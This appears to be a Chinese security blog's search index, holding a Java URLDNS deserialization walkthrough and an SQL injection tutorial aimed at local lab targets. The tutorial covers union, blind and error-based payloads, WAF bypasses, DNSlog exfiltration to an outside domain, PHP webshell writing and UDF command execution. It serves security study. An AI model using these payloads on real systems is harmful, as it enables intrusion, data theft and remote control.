s.readObject(); putVal(hash(key), key, value, false, false); } } } 注意到最后的putVal(hash(key), key, value, false, false);，调用了hash函数计算哈希值 跟进hash函数： static final int hash(Object key) { int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h \u003e\u003e\u003e 16); } 这里调用了键的hashCode函数。我们该链中是将其设置成URL类，查看URL类的hashCode函数 public synchronized int hashCode() { if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode; } 如果hashCode==-1的话，就会重新计算hashCode，调用handler的hashCode()。看一下handler： transient URLStreamHandler handler; handler属性是URLStreamHandler类的对象，所以继续跟进URLStreamHandler类的hashCode()方法： 继续跟进getHostAddress()： 这⾥ InetAddress.getByName(host) 的作⽤是根据主机名，获取其IP地址，在⽹络上其实就是⼀次 DNS查询。 ","date":"2023-05-21","objectID":"/post/a0fd0c84/:1:0","tags":["Javasec"],"title":"URLDNS链分析","uri":"/post/a0fd0c84/"},{"categories":["Java安全"],"content":"2、利用 一个很奇妙的点就在于，HashMap里面最常用的put方法里面居然就有： public V put(K key, V value) { return putVal(hash(key), key, value, false, true); } 理论来说这样使用一次put就会触发一次URLDNS 那个key，即URL类的对象的hashCode属性值为-1 考虑到最开始调用put()，虽然没有触发URLDNS，但是同样调用了hash()，导致了传入的URL类对象的哈希值被计算了一次，hashCode不再是-1了，因此还需要再修改它的hashCode属性。但是注意这个属性是private： private int hashCode = -1; public synchronized int hashCode() { if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode; } 因此只能用反射： //反射获取 URL的hashcode方法 Field f = Class.forName(\"java.net.URL\").getDeclaredField(\"hashCode\"); //使用内部方法 f.setAccessible(true); // put 一个值的时候就不会去查询 DNS，避免和刚刚混淆 f.set(url, 0xdeadbeef); hashMap.put(url, \"123\"); // hashCode 这个属性放进去后设回 -1, 这样在反序列化时就会重新计算 hashCode f.set(url, -1); 这样就能修改hashCode为-1 故整体代码如下： import java.io.FileOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.net.URL; import java.util.HashMap; public class URLDNS { public static void main(String[] args) throws Exception { //漏洞出发点 hashmap，实例化出来 HashMap\u003cURL, String\u003e hashMap = new HashMap\u003cURL, String\u003e(); //URL对象传入自己测试的dnslog URL url = new URL(\"http://1tvcx6l0a7bgc6ztu31ydi4zeqki88wx.oastify.com\"); //反射获取 URL的hashcode方法 Field f = Class.forName(\"java.net.URL\").getDeclaredField(\"hashCode\"); //使用内部方法 f.setAccessible(true); // put 一个值的时候就不会去查询 DNS，避免和刚刚混淆 f.set(url, 0xdeadbeef); hashMap.put(url, \"123\"); // hashCode 这个属性放进去后设回 -1, 这样在反序列化时就会重新计算 hashCode f.set(url, -1); //序列化成对象，输出出来 ObjectOutputStream objos = new ObjectOutputStream(new FileOutputStream(\"./out.bin\")); objos.writeObject(hashMap); } } 运行序列化过程，查看是否有DNS解析记录发现没有，因为在put之前修改了hashCode的值为非-1这样就不会参与解析，避免跟反序列化构成中的解析混淆 我们执行反序列化过程 import java.io.FileInputStream; import java.io.ObjectInputStream; public class test { public static void main(String[] args) throws Exception { //读取目标 ObjectInputStream ois = new ObjectInputStream(new FileInputStream(\"./out.bin\")); //反序列化 ois.readObject(); } } 看到解析记录 ","date":"2023-05-21","objectID":"/post/a0fd0c84/:2:0","tags":["Javasec"],"title":"URLDNS链分析","uri":"/post/a0fd0c84/"},{"categories":["常见安全漏洞"],"content":"SQL注入相关基础知识 ","date":"2023-03-30","objectID":"/post/9a9550e5/:0:0","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"1、数据库基础知识 ","date":"2023-03-30","objectID":"/post/9a9550e5/:1:0","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"1.1 定义 信息 数据库是一个存储数据的仓库， 以一定方式存储在一起、能与多个用户共享、具有尽可能小的冗余度，与应用程序彼此独立的数据集合 ","date":"2023-03-30","objectID":"/post/9a9550e5/:1:1","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"1.2 分类 关系型数据库-SQL 信息 类似表格，表与表之前存在复杂的关系 举例：MySQL、SQLServer 非关系型数据库 - NoSQL 信息 Key - Value 形式，简化数据库结构、避免冗余。 举例：MangoDB、Redis、memcached ","date":"2023-03-30","objectID":"/post/9a9550e5/:1:2","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"1.3 相关知识 --查看数据库 show databases(); --使用数据库 use information_schema --查看当前使用数据库 select database(); --查看数据表 show tables(); --查看数据库版本 select version(); --使用当前数据库的用户 select user(); --查看数据库路径 select @@datadir --查看安装路径 select @@basedir --查看系统类型 select @@version_compile_os ","date":"2023-03-30","objectID":"/post/9a9550e5/:1:3","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"1.4 information-shcema 注意 mysql 5.0版本以下不存在information_schema 信息 是信息数据库其中保存着关于 MySQL 服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表的数据类型与访问权限等。对于 Web 渗透过程中用途很大 SCHEMATA 表：提供了当前 MySQL 实例中所有数据库的信息。是 show databases 的结果取之此表。 TABLES 表：提供了关于数据库中的表的信息(包括视图)。 COLUMNS 表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。 ","date":"2023-03-30","objectID":"/post/9a9550e5/:1:4","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"2、SQL注入 ","date":"2023-03-30","objectID":"/post/9a9550e5/:2:0","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"2.1 定义 Web 程序代码中对于用户提交的参数未做过滤就直接放到 SQL 语句中执 行，导致参数中的特殊字符打破了 SQL 语句原有逻辑，黑客可以利用该漏洞执 行任意 SQL 语句，如查询数据、下载数据、写入 webshell 、执行系统命令以 及绕过登录限制等 形成原因 用户能够控制传参 SQL 语句中拼接了用户传参的内容 拼接后的 SQL 语句在数据库中执行 摘要 总之：将用户输入的数据作为代码带入数据库执行 ","date":"2023-03-30","objectID":"/post/9a9550e5/:2:1","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"2.2 注入分类 布尔型注入 联合查询注入 时间延迟注入 报错型注入 堆叠注入 ","date":"2023-03-30","objectID":"/post/9a9550e5/:2:2","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"3、判断SQL注入 ","date":"2023-03-30","objectID":"/post/9a9550e5/:3:0","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"3.1 判断是否存在sql注入 https://127.0.0.1/SQL.php?id=1' 如果页面返回错误，则存在 SQL 注入；原因是无论字符型还是整型都会因为单引号个数不匹配而报错 ","date":"2023-03-30","objectID":"/post/9a9550e5/:3:1","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"3.2 判断注入类型 摘要 数字型： 构造url https://127.0.0.1/SQL.php?id=1 and 1=1 https://127.0.0.1/SQL.php?id=1 and 1=2 查看结果是否相同，若1=1正常返回信息；1=2没有正常返回信息则证明存在数字型注入 摘要 字符型： 构造url https://127.0.0.1/SQL.php?id=1' and '1'='1' https://127.0.0.1/SQL.php?id=1' and '1'='2' 查看结果是否相同，若'1’=‘1’正常返回信息；‘1’=‘2’没有正常返回信息则证明存在数字型注入 ","date":"2023-03-30","objectID":"/post/9a9550e5/:3:2","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"3.3 SQL 数据库的类型 3.3.1 通过报错信息 MySQL you have an error in your SQL syntax,check the manual that corrsponds to your mysql server version for the tifht syntax to use near ” at line x Access Microsoft JET Database… MSSQL Microsoft ODBC Database… 3.3.2 数据库标志性信息 sql server：select @@version-- Oracle：select banner from v$version mysql：select @@version，version()-- ，length(user)\u003e0正常 postgresql：select version()-- 3.3.3 数据库特有库名 MySQL：information_schema Access：mysysobjects Oracle：sys.user_tables MSSQL：sysobjects 3.3.4 数据库特有函数 sql server：@@pack_received @@rowcount mysql：connection_id()、last_insert_id()、row_count() orcale：bitand(1,1) postgresql： select extract(dow from now()) 在 mssql 中可以调用 substring。oracle 则只可调用 substr 3.3.5 字符串处理方式 mssql：id=1 and 'a'+'b'='ab' mysql：id=1 and 'a'+'b'='ab' ， 'ab'=concat('a','b') oracle：id=1 and 'a'+'b'='a'||'b' ，'ab'=concat('a','b') postgresql：id=1 and 'a'+'b'='a'||'b' ,'ab'=concat('a','b') 3.3.6 特殊符号及注释 null 和 %00 是 access 支持的注释 # 是 MySQL 中的注释符，返回错误说明该注入点可能不是 MySQL，另外也支持--，和 /* */ 注释 -- 和 /* */ 是 Oracle，SQL server 和 MySQL 支持的注释符，如果正常，说明可能就是这三个数据库其中之一。 ; 是子句查询标识符，在 Oracle 中不支持多行查询，返回错误，很可能是 Oracle 数据库。 ","date":"2023-03-30","objectID":"/post/9a9550e5/:3:3","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"4、联合查询注入 ","date":"2023-03-30","objectID":"/post/9a9550e5/:4:0","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"4.1 原理 信息 union操作用于合并两个查询或者多个select语句的结果集 TIP：union内部的select语句必须有相同数量的列，当不同时不能正常执行会出现报错信息 ","date":"2023-03-30","objectID":"/post/9a9550e5/:4:1","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"4.2 常用语句 --库名 union select 1,group_concat(schema_name),3 from information_schema.schemata union select 1,(select schema_name from information_schema.schemata limit 0,1),3 --表名 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' --列名 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='security' and table_name='emails' --数据 union select 1,group_concat(id,email_id),3 from security.emails ","date":"2023-03-30","objectID":"/post/9a9550e5/:4:2","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"5、时间型盲注\u0026布尔型盲注 盲注是注入的一种，指的是在不知道数据库返回值的情况下对数据中的内容进行猜测，实施 SQL 注入。盲注一般分为布尔盲注和基于时间的盲注和报错的盲注。 摘要 时间型：通过注入特定语句，根据页面请求的物理反馈，来判断是否注入成功，如：在 SQL 语句中使用 sleep() 函数看加载网页的时间来判断注入点。 布尔型：页面只返回 True 和 False 两种状态(类型)页面。利用页面返回不同，逐个猜解数据。 ","date":"2023-03-30","objectID":"/post/9a9550e5/:5:0","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"5.1 原理示意 select * from user where id = '?' ?` 为用户输入，替代为：`4' and sleep(3)# 实际执行的 SQL 语句：select * from user where id = '4' and sleep(3)# 当 ID = 4 存在时，sleep 3 秒 当 ID = 4 不存在时，直接返回 整条拼接出来的 SQL 是正确的就执行 sleep，前面错误（不存在），sleep(3) 不执行 ","date":"2023-03-30","objectID":"/post/9a9550e5/:5:1","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"5.2 常用函数 5.2.1 编码转换函数 ord('a')：将字符转化为 ascii 码 ascii('a')：将字符转化为 ascii 码 char(97)：将 ascii 转化为字符 5.2.2 条件判断函数 if(exp1, exp2, exp3)：exp1 成立，执行 exp2，否则执行 exp3。 case when then 函数：select case when username=\"admin\" then sleep(1) else \"error\" end from wp_user_ 5.2.3 截取函数 substr 函数 substr(str, pos, len)：从 pos 位置开始，截取字符串 str 的 len 长度 substr(str from pos for length) ：可以用在过滤了 , 的情况 substring 函数 substring(str, pos, len)：从 pos 位置开始，截取字符串 str 的 len 长度 substring(str from pos for length) ：可以用在过滤了 , 的情况 注意：pos 从 1 开始 id=1 and if(ord(substr(database(),1,1))=116,1,0)%23 select substring(database(), from 1 for 1) select substring(database(), 0, 1) mid 函数 mid(str, pos, length) mid(str from pos for length) select mid(database(), from 1 for 1) select mid(database(), 1, 1) left 函数 从左开始截取字符串 left(str, len) select left(database(), 1) right 函数 从右开始截取字符串 right(str, len) 利用正则表达式逐位匹配 select * from wp_user_ where password rlike \"^1\" select * from wp_user_ where password REGEXP \"^1\" select * from wp_user_ where password REGEXP \"^12\" ... 5.2.4 延时函数 sleep(n)：程序挂起 n 秒 if(ascii(substr(database() from 0))=97, sleep(3),0) benchmark(count, sha(1))：执行 sha(1) 函数 count 次达到延时的目的 SELECT BENCHMARK(10000000, sha(1)) 利用笛卡尔积制造延时： SELECT count(*) from information_schema.columns A, information_schema.columns B, information_schema.tables C; 实际测试使用information_schema.columns并不稳定，对于不同的网站效果不同，太少会没有明显延时效果，太多则会导致数据库崩溃 使用character_sets（41行）和collations（222行）效果可能会好点，因为数据量相对计较统一 利用正则表达式匹配长字符串制造延时： select * from wp_user_ where id =1 and IF(1,concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',0) 5.2.5 其它函数 count()：计算总数 length()：返回字符串的长度 ","date":"2023-03-30","objectID":"/post/9a9550e5/:5:2","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"6、盲注的加速方式 信息 1、利用DNSlog加速注入(windows平台) 2、利用二分法加速注入 ","date":"2023-03-30","objectID":"/post/9a9550e5/:6:0","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"6.1 DNSlog注入 基本原理 除了了解基本原理，还要了解两个概念UNC路径、secure_file_priv和必备条件 必备条件 1、MYSQL开启load_file() 2、Windows平台 3、DNSlog平台 UNC路径 问题 什么是UNC路径？ UNC路径就是类似 \\\\softer 这样的形式的网络路径 例子：\\\\www.test.com\\abc.txt 不过也可以这样写//www.test.com/abc.txt 推荐 tip: 读取远程文件就要用到UNC路径 secure_file_priv secure_file_priv的值，默认为NULL，可选项如下： secure_file_priv 为 NULL 时，表示限制mysqld不允许导入或导出。 secure_file_priv 为 /tmp 时，表示限制mysqld只能在/tmp目录中执行导入导出，其他目录不能执行。 secure_file_priv 没有值时，表示不限制mysqld在任意目录的导入导出。 load_file函数 使用案例：select load_file('D:/1.txt') as result;读取D盘中的1.txt文件内容：load file test 注意 使用该函数必须有权限读取并且文件必须完全可读 DNSlog盲注实例 以sql-labs题目的第八题为例： --获取当前数据库名 http://localhost/sqli-labs/Less-8/?id=1' and load_file(concat('//',database(),'.0e9cc54a.ipv6.1433.eu.org/a'))--+ --获取表名 http://localhost/sqli-labs/Less-8/?id=1' and load_file(concat('//',(select table_name from information_schema.tables where table_schema='security' limit 3,1),'.0e9cc54a.ipv6.1433.eu.org/a'))--+ --后续的步骤与手动注入类似 下图是获取到的表名： 注意事项 1、由于每一级域名的长度只能为63个字符，长度过长时需要截断获取 2、因为存在特殊符号时无法解析所以常对查询内容使用hex编码 3、Linux服务器没有unc路径，也就无法使用dnslog注入 4、读取文件必须小于max_allowed_packet ","date":"2023-03-30","objectID":"/post/9a9550e5/:6:1","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"7、报错型注入 ","date":"2023-03-30","objectID":"/post/9a9550e5/:7:0","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"7.1 原理 用于使用 SQL 语句报错的语法，用于注入结果无回显，但显示错误信息有输出的情况 返回的信息即是攻击者需要的信息 MySQL 报错注入主要分为以下几类： BigInt 等数据类型溢出 Xpath 语法错误 count() + rand() + group by 导致主键重复 空间数据类型函数错误 ","date":"2023-03-30","objectID":"/post/9a9550e5/:7:1","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"7.2 常用函数 7.2.1 updatexml updatexml 第二个参数需要传入的是 Xpath 格式的字符串。输入不符合，将参数值返回并报错。 报错长度最大为 32 位 --显示当前数据库 updatexml(1,CONCAT(0x7e, database()),1) --显示所有数据库 updatexml(1,CONCAT(0x7e,(select schema_name FROM INFORMATION_SCHEMA.SCHEMATA limit x,1), 0x7e),1) --获取表名 updatexml(1,CONCAT(0x7e,(select table_name from information_schema.tables where table_schema=\"sectest\" limit x,1), 0x7e),1) updatexml(1,make_set(3,'~',(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) --获取列名 updatexml(1,CONCAT(0x7e,(select column_name from information_schema.COLUMNS where table_name=\"wp_user_\" limit 1,1), 0x7e),1) updatexml(1,make_set(3,'~',(select group_concat(column_name) from information_schema.columns where table_name=\"users\")),1) --获取数据 updatexml(1,CONCAT(0x7e,(select username from wp_user_ limit 0,1), 0x7e),1) updatexml(1,CONCAT(0x7e,(select password from wp_user_ where username=\"admin\" limit 0,1), 0x7e),1) updatexml(1,CONCAT(0x7e,(select GROUP_CONCAT(username, 0x3a, password) from wp_user_ where id=1), 0x7e),1) updatexml(1,make_set(3,'~',(select data from users)),1)# 7.2.2 floor 显错注入 and (select 1 from (select count(*), concat(user(), floor(rand(0)*2))x from information_schema.tables group by x)a) and (select 1 from (select count(*), concat((select group_concat(username,0x3a,password) from wp_user_ where id=1), floor(rand(0)*2))x from information_schema.tables group by x)a) 7.2.3 其它显错注入 and extractvalue(1,concat(0x7e,(select database()))) //1105 - XPATH syntax error: '~sectest', Time: 0.000000s and exp(~(select * from (select user())a)) // mysql5 union select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))a; //1060 - Duplicate column name '5.7.23', Time: 0.000000s ","date":"2023-03-30","objectID":"/post/9a9550e5/:7:2","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"8、堆叠注入 多条 SQL 语句一起执行。在 MySQL 中，每条语句结尾加 ; 表示语句结束。这样可以考虑多条 SQL 语句一起使用 问题 堆叠注入和 UNION 注入的差别是？ UNION 执行的语句类型是有限的，只可以用来执行查询语句而堆叠注入可以执行任意语句 并不是每一个环境下都可以执行，很可能受 API 或者数据库引擎不支持的限制，同时权限不足也是面临的主要问题 在真实环境中： 通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的 在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息 在 PHP - MySQL 中相关的 API $query = \"SELECT CURRENT_USER();\"; $query .= \"SELECT Name FROM City ORDER BY ID LIMIT 20, 5\"; /* 批量执行查询 */ if ($mysqli-\u003emulti_query($query)) { do { /* store first result set */ if ($result = $mysqli-\u003estore_result()) { while ($row = $result-\u003efetch_row()) { printf(\"%s\\n\", $row[0]); } $result-\u003efree(); } /* print divider */ if ($mysqli-\u003emore_results()) { printf(\"-----------------\\n\"); } } while ($mysqli-\u003enext_result()); } ","date":"2023-03-30","objectID":"/post/9a9550e5/:8:0","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"9 WAF 绕过 ","date":"2023-03-30","objectID":"/post/9a9550e5/:9:0","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"9.1 and 和 or 绕过 过滤代码：preg_match('/(and|or)/i', $id) 绕过：利用 || 代替 or，\u0026\u0026 代替 and ","date":"2023-03-30","objectID":"/post/9a9550e5/:9:1","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"9.2 union 过滤绕过 过滤代码：preg_match('/(and|or|union)/i', $id) 绕过： || (select user from users where user_id=1)='admin' 问题 怎么知道 user 表、user 列、admin 字段？ 表名确实可以猜解，尤其是 user 这种常用表 如果猜不到，通过 information_schema.tables 及 substr 来联合判断 列名和字段内容也是同理 ","date":"2023-03-30","objectID":"/post/9a9550e5/:9:2","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"9.3 where 过滤绕过 过滤代码：preg_match('/(and|or|union|where)/i', $id) 绕过：|| (select user from users limit 1,1)='admin' ","date":"2023-03-30","objectID":"/post/9a9550e5/:9:3","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"9.4 limit 过滤绕过 过滤代码：preg_match('/(and|or|union|where|limit)/i', $id) 绕过：|| (select min(user) from group by user_id having user_id=1 ='admin' ","date":"2023-03-30","objectID":"/post/9a9550e5/:9:4","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"9.5 group by 过滤绕过 过滤代码：preg_match('/(and|or|union|where|limit|group by)/i', $id) 绕过： ||(select substr((select group_concat(name)name from test), 1, 1))='t' ","date":"2023-03-30","objectID":"/post/9a9550e5/:9:5","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"9.6 select 及单引号过滤绕过 过滤代码：preg_match('/(and|or|union|where|limit|group by|select|\\')/i', $id) 绕过： 布尔盲注不需要 select || substr(name,1,1)=0x74 || substr(name,1,1)=unhex(74) ","date":"2023-03-30","objectID":"/post/9a9550e5/:9:6","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"9.7 hex、unhex 及 substr 过滤绕过 - binary 过滤代码：preg_match('/(and|or|union|where|limit|group by|select|\\'|hex|unhex|substr)/i', $id) 绕过： || binary(name) = 0x74657374 ","date":"2023-03-30","objectID":"/post/9a9550e5/:9:7","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"9.8 空格过滤绕过 过滤代码：preg_match('/(and|or|union|where|limit|group by|select|\\'|hex|unhex|substr|\\s)/i', $id) 绕过：注释符代替空格 ","date":"2023-03-30","objectID":"/post/9a9550e5/:9:8","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"9.9 等号过滤绕过 过滤代码：preg_match('/(and|or|union|where|limit|group by|select|\\'|hex|unhex|substr|\\s| =)/i', $id) 绕过：利用 like、rlike、regexp、!(username\u003c\u003e\"admin\")(table_name\u003c\u003e'ffll44jj') 代替等号 ","date":"2023-03-30","objectID":"/post/9a9550e5/:9:9","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"9.10 其它类型的绕过 双写绕过 双重编码绕过 ","date":"2023-03-30","objectID":"/post/9a9550e5/:9:10","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"10、二次注入 ","date":"2023-03-30","objectID":"/post/9a9550e5/:10:0","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"10.1 原理 ","date":"2023-03-30","objectID":"/post/9a9550e5/:10:1","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"10.2 实例 --注册账号，输入我们的账号密码，账号设置成admin'#,密码随意，admin'#被存进数据库 --当我们修改admin'#的密码时执行的sql语句是 update users set password='$new_pass' where username='admin'# and password='$old_pass'; --这时候 and 条件被注释掉，我们随意输入密码就达到了，修改admin账户密码的目的 ","date":"2023-03-30","objectID":"/post/9a9550e5/:10:2","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"11、SQL 注入命令执行 ","date":"2023-03-30","objectID":"/post/9a9550e5/:11:0","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"11.1 SQL 注入写文件 通过 SQL 注入，直接写入 webshell 文件到服务器，通过 GET 方法或者 POST 方法提交并执行外部指令，为后续进一步远程控制，提权，创造条件。 注意 需要 mysql 用户在写入文件夹下有写入权限，即 secure_file_priv 为不为空 在 MySQL 5.5.3 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件 在 MySQL 5.5.3 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件 当secure_file_priv 不为空时，可以使用 general_log 写文件： set global general_log = on; set global general_log_file = 'D:/webshell.php'; select '\u003c?php eval($_POST['key']) ?\u003e'; 11.1.1 union select 后写入 select username, password from users where id=\"1\" union select null,'\u003c?php @eval($_REQUEST[1]);?\u003e' into outfile '/var/www/html/webshell.php' 注意：在 windows 下的分隔符为 /（斜杠）。 11.1.2 行分隔符写入 lines terminated by 在每行终止的位置添加 xx 内容 lines starting by 以每行开始的位置添加 xx 内容 fields terminated by 以每个字段的位置添加 xx 内容 COLUMNS terminated by 以每个字段的位置添加 xx 内容 --lines terminated by 写入 ?id=1 limit 1 into outfile 'C:/wamp64/www/work/webshell.php' lines terminated by '\u003c?php phpinfo() ?\u003e'; --lines starting by 写入 ?id=1 limit 1 into outfile 'C:/wamp64/www/work/webshell.php' lines starting by '\u003c?php phpinfo() ?\u003e'; --fields terminated by 写入 ?id=1 into outfile 'C:/wamp64/www/work/webshell.php' fields terminated by '\u003c?php phpinfo() ?\u003e'; --COLUMNS terminated by 写入 ?id=1 limit 1 into outfile 'C:/wamp64/www/work/webshell.php' COLUMNS terminated by '\u003c?php phpinfo() ?\u003e'; ","date":"2023-03-30","objectID":"/post/9a9550e5/:11:1","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"11.2 用户自定义函数 - UDF 还可以利用「用户自定义函数」的方式，即 User Defined Functions(UDF) 来执行命令。通过 lib_mysqludf_sys 提供的函数可以执行系统命令关键语句: sys_eval()，执行任意命令，并将输出返回 sys_exec()，执行任意命令，并将返回码返回 sys_get()，获取一个环节变量 sys_set()，创建或修改一个环境变量 11.2.1 UDF 库文件获取 https://github.com/mysqludf/lib_mysqludf_sys sqlmap/data/udf/mysql/ sqlmap 下的文件经过编码，需要使用 sqlmap/extra/cloak 目录下的 cloak.py 文件进行解码 # 解码文件 python cloak.py -d -i /path/to/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_ -o lib_linux.so 11.2.2 UDF 库文件写入 将 so 文件转成 16 进制，以 16 进制编码形式写入 select unhex('???') into dumpfile '/usr/lib/mysql/plugin/lib_linux.so' 11.2.3 dumpfile vs. outfile 若我们想把一个可执行 2 进制文件用 into outfile 函数导出事实上导出后就会被破坏。 因为 into outfile 函数会在行末端写入新行，更致命的是会转义换行符，这样的话这个 2 进制可执行文件就会被破坏。 这时候我们用 into dumpfile 就能导出一个完整能执行的 2 进制文件 into dumpfile 函数不对任何列或行进行终止，也不执行任何转义处理。 11.2.4 自定义函数 create function sys_eval returns string soname \"lib_linux.so\"; select sys_eval('ifconfig'); ","date":"2023-03-30","objectID":"/post/9a9550e5/:11:2","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"11.3 自动化工具 sqlmap -u \"url\" --os-shell sqlmap -u \"url\" --os-cmd=ifconfig ","date":"2023-03-30","objectID":"/post/9a9550e5/:11:3","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"12、注入技巧 从 SQL 语法角度，从不同的注入点位置说明 SQL 注入的技巧 ","date":"2023-03-30","objectID":"/post/9a9550e5/:12:0","tags":["SQL注入"],"title":"常见安全漏洞-SQL注入","uri":"/post/9a9550e5/"},{"categories":["常见安全漏洞"],"content":"12.1 SELECT 注入 select 语句用于数据表记录的查询，常在界面展示的过程中使用 12.1.1 注入点在 select_expr 源代码如下所示： \u003c?php $conn = mysqli_connect(\"127.0.0.1\", \"root\", \"root\", \"test\"); $res = mysqli_query($conn, \"SELECT ${_GET['id']}, content FROM wp_news\"); $row = mysqli_fetch_array($res); echo \"$row['title']\"; echo \"$row['content']\"; ?\u003e 可以采取时间盲注的方式，但是根据 MySQL 的语法，有更优的解决方法，即利用 AS 别名的方法，直接将查询的结果显示到界面中。 payload：?id=(select pwd from wp_user as title) 12.1.2 注入点在 table_reference 上文的 SQL 查询语句改为：$res 